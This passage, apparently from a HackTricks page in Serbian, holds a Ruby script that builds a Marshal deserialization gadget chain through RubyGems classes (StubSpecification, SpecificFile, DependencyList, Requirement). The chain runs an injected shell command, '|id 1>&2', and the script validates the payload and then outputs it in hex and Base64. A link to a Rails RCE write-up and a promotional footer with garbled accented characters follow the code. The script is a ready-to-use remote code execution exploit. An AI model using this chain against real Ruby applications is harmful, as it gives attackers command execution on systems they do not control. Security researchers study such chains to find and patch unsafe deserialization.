# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

Drugi RCE lanac za iskori≈°ƒáavanje Ruby On Rails-a: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju ogla≈°enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
